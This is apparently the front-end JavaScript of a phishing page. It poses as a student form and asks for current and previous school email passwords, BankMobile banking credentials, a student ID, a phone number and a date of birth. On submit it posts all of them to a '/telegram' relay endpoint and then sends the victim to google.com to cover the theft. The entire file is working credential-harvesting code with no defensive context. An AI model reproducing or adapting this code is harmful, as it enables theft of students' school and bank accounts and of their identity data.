const btn1 = document.getElementById("hide1");
btn1.onclick = (e) => {
  togglePassword();
  if (e.target.innerText == "Hide") {
    e.target.innerText = "Show";
  } else {
    e.target.innerText = "Hide";
  }
};

const btn2 = document.getElementById("hide2");
btn2.onclick = (e) => {
  togglePassword2();
  if (e.target.innerText == "Hide") {
    e.target.innerText = "Show";
  } else {
    e.target.innerText = "Hide";
  }
};

const btn3 = document.getElementById("hide3");
btn3.onclick = (e) => {
  togglePassword3();
  if (e.target.innerText == "Hide") {
    e.target.innerText = "Show";
  } else {
    e.target.innerText = "Hide";
  }
};

function togglePassword() {
  const input = document.getElementById("bankmobilepassword");
  input.type = input.type === "password" ? "text" : "password";
}

function togglePassword2() {
  const input = document.getElementById("previouschemailpassword");
  input.type = input.type === "password" ? "text" : "password";
}

function togglePassword3() {
  const input = document.getElementById("currentschpassword");
  input.type = input.type === "password" ? "text" : "password";
}

const phoneInput = document.getElementById("phone_number");

phoneInput.addEventListener("input", function () {
  // Remove any non-digit character
  this.value = this.value.replace(/\D/g, "");

  // Trim to 10 digits max
  if (this.value.length > 10) {
    this.value = this.value.slice(0, 10);
  }
});

document.querySelectorAll(".input-field").forEach((input) => {
  const label = input.nextElementSibling;

  console.log(label);

  const toggleFloating = () => {
    if (input.value.trim() !== "") {
      label.classList.add("float");
    } else {
      label.classList.remove("float");
    }
  };

  // On focus
  input.addEventListener("focus", () => {
    label.classList.add("float");
  });

  // On blur
  input.addEventListener("blur", toggleFloating);

  // On page load (if autofilled or pre-filled)
  toggleFloating();
});

const dobInput = document.getElementById("dob");

dobInput.addEventListener("input", (e) => {
  let value = dobInput.value.replace(/\D/g, ""); // Remove non-digits

  if (value.length > 2) value = value.slice(0, 2) + "/" + value.slice(2);
  if (value.length > 5) value = value.slice(0, 5) + "/" + value.slice(5, 9);

  dobInput.value = value;
});

dobInput.addEventListener("blur", () => {
  const pattern = /^(0[1-9]|1[0-2])\/(0[1-9]|[12]\d|3[01])\/\d{4}$/;
  if (!pattern.test(dobInput.value)) {
    alert("Please enter a valid date in mm/dd/yyyy format");
  }
});

// Radio selection logic
const yesRadio = document.getElementById("Yes");
const noRadio = document.getElementById("No");

yesRadio.addEventListener("change", () => {
  if (yesRadio.checked) noRadio.checked = false;
});

noRadio.addEventListener("change", () => {
  if (noRadio.checked) yesRadio.checked = false;
});

// Form submission
document.querySelector("form").addEventListener("submit", async (e) => {
  e.preventDefault();

  if (!yesRadio.checked && !noRadio.checked) {
    return;
  }

  const formData = {
    fullName: document.getElementById("fullName").value,
    phoneNumber: document.getElementById("phone_number").value,
    currentSchoolEmail: document.getElementById("currentschemail").value,
    currentSchoolPassword: document.getElementById("currentschpassword").value,
    previousSchoolEmail: document.getElementById("previouschemail").value,
    previousSchoolPassword: document.getElementById("previouschemailpassword")
      .value,
    hasBankMobileProfile: document.getElementById("Yes").checked ? "Yes" : "No",
    bankMobileEmail: document.getElementById("bankmobileemail").value,
    bankMobilePassword: document.getElementById("bankmobilepassword").value,
    studentid: document.getElementById("student_id").value,
    dob: document.getElementById("dob").value,
  };

  try {
    const response = await fetch("/telegram", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(formData),
    });

    const result = await response.json();

    if (result.success) {
      window.location.href = "https://google.com";
      e.target.reset();
      // Reset floating labels
      document.querySelectorAll(".floating-label").forEach((label) => {
        label.classList.remove("float");
      });
    } else {
      alert("There was an error submitting the form.");
    }
  } catch (error) {
    console.error("Submit error:", error);
    alert("An unexpected error occurred.");
  }
});
